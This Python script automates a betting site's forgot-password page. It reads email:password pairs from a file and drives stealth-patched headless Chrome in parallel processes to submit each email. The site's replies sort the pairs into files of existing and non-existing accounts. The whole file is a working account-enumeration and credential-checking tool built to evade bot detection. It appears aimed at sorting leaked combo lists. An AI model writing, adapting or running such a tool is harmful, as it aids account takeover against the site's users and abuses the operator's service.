# file: check1.py

import os
import time
import threading
import multiprocessing as mp
from datetime import datetime

import tkinter as tk
from tkinter import messagebox

import keyboard
import undetected_chromedriver as uc

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# =========================
# CONFIG
# =========================
BASE_DIR = r"C:\Inbet"

LEAVE_FILE = os.path.join(BASE_DIR, "leave.txt")
CHANGE_FILE = os.path.join(BASE_DIR, "change.txt")
WRONGPASS_FILE = os.path.join(BASE_DIR, "wrongpass.txt")

CREDENTIALS_FILE = "emails.txt"
LOGIN_PAGE_URL = "https://inbet.com/forgot-password"

POPUP_WAIT = 20

max_workers = 5
headless_mode = True

STOP_EVENT = None
DRIVER_PATH = None


# =========================
# UTILS
# =========================
def ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def safe_append(path: str, line: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def read_credentials(path: str):
    creds = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if ":" not in line:
                continue
            u, p = line.split(":", 1)
            if u and p:
                creds.append((u, p))
    return creds


# =========================
# EMERGENCY STOP (MAIN ONLY)
# =========================
def emergency_stop_listener(stop_event: mp.Event):
    buffer = []
    while True:
        e = keyboard.read_event()
        if e.event_type == keyboard.KEY_DOWN and e.name == "s":
            now = time.time()
            buffer.append(now)
            buffer[:] = [t for t in buffer if now - t <= 3]
            if len(buffer) >= 5:
                print("\n[EMERGENCY STOP]")
                stop_event.set()
                return


# =========================
# MULTIPROCESS INIT
# =========================
def init_worker(stop_event: mp.Event, driver_path: str):
    global STOP_EVENT, DRIVER_PATH
    STOP_EVENT = stop_event
    DRIVER_PATH = driver_path


# =========================
# SELENIUM
# =========================
def prepare_chromedriver() -> str:
    """
    Patch chromedriver ONCE.
    This avoids UC race conditions on Windows.
    """
    options = uc.ChromeOptions()
    options.add_argument("--headless=new")

    driver = uc.Chrome(options=options)
    path = driver.service.path
    driver.quit()

    print(f"[INFO] Chromedriver ready: {path}")
    return path


def init_driver():
    options = uc.ChromeOptions()
    options.add_argument("--disable-logging")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--log-level=3")

    if headless_mode:
        options.add_argument("--headless=new")

    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)

    driver = uc.Chrome(
    options=options,
    driver_executable_path=DRIVER_PATH,
    version_main=143,  # or 109 / 110+, any modern value
    use_subprocess=True
)

    driver.set_window_size(1920, 1080)
    return driver


def worker(credential):
    if STOP_EVENT.is_set():
        return

    username, password = credential
    driver = init_driver()

    try:
        driver.get(LOGIN_PAGE_URL)
        wait = WebDriverWait(driver, 20)

        try:
            wait.until(EC.element_to_be_clickable(
                (By.ID, "CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll")
            )).click()
        except Exception:
            pass

        email = wait.until(EC.visibility_of_element_located((
            By.XPATH, "//input[@name='Email' or contains(@placeholder,'Имейл')]"
        )))
        email.send_keys(username)

        wait.until(EC.element_to_be_clickable((
            By.XPATH, "//button[@type='submit' and @data-qid='regFinish']"
        ))).click()

        popup = WebDriverWait(driver, POPUP_WAIT).until(
            EC.presence_of_element_located((
                By.XPATH,
                "//p[contains(text(),'Имейл с инструкции')] | "
                "//b[contains(text(),'не съществува')]"
            ))
        )

        text = popup.text.strip()
        stamp = ts()

        if "Имейл с инструкции" in text:
            safe_append(CHANGE_FILE, f"{stamp} | {username}:{password}")
            print(f"[CHANGE] {username}")

        elif "не съществува" in text:
            safe_append(LEAVE_FILE, f"{stamp} | {username}:{password}")
            print(f"[LEAVE] {username}")

        else:
            safe_append(WRONGPASS_FILE, f"{stamp} | {username}:{password}")
            print(f"[UNKNOWN] {username}")

    except Exception as e:
        safe_append(WRONGPASS_FILE, f"{ts()} | {username}:{password}")
        print(f"[ERROR] {username}: {e}")

    finally:
        driver.quit()


# =========================
# UI
# =========================
def config_popup():
    def submit():
        nonlocal root
        try:
            global max_workers, headless_mode
            max_workers = int(entry.get())
            if max_workers < 1:
                raise ValueError
            headless_mode = bool(headless.get())
            root.destroy()
        except ValueError:
            messagebox.showerror("Error", "Invalid worker count")

    root = tk.Tk()
    root.title("WinBet Config")

    tk.Label(root, text="Max Processes").pack(pady=5)
    entry = tk.Entry(root)
    entry.insert(0, "5")
    entry.pack()

    headless = tk.IntVar(value=1)
    tk.Checkbutton(root, text="Headless", variable=headless).pack(pady=5)

    tk.Button(root, text="Start", command=submit).pack(pady=10)
    root.mainloop()


# =========================
# MAIN
# =========================
def main():
    mp.freeze_support()

    config_popup()

    creds = read_credentials(CREDENTIALS_FILE)
    if not creds:
        print("[ERROR] No credentials found")
        return

    print("[INFO] Installing chromedriver once...")
    driver_path = prepare_chromedriver()

    stop_event = mp.Event()

    threading.Thread(
        target=emergency_stop_listener,
        args=(stop_event,),
        daemon=True
    ).start()

    print(f"[INFO] Processes={max_workers} | Headless={headless_mode}")

    with mp.Pool(
        processes=max_workers,
        initializer=init_worker,
        initargs=(stop_event, driver_path)
    ) as pool:
        for _ in pool.imap_unordered(worker, creds):
            if stop_event.is_set():
                pool.terminate()
                break


if __name__ == "__main__":
    main()
